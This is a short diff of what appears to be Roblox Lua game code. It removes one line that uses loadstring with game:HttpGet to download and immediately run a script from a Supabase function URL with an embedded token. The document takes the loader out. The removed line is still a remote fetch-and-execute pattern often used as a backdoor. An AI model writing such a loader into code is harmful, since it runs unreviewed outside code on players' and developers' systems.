@@ -3,5 +3,4 @@ task.spawn(function()
 end)
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://ayhedtqtozxllxqvgnou.supabase.co/functions/v1/serve-script?id=mrdgd22mfchful&token=fb345a68a94e497a"))()
 end)
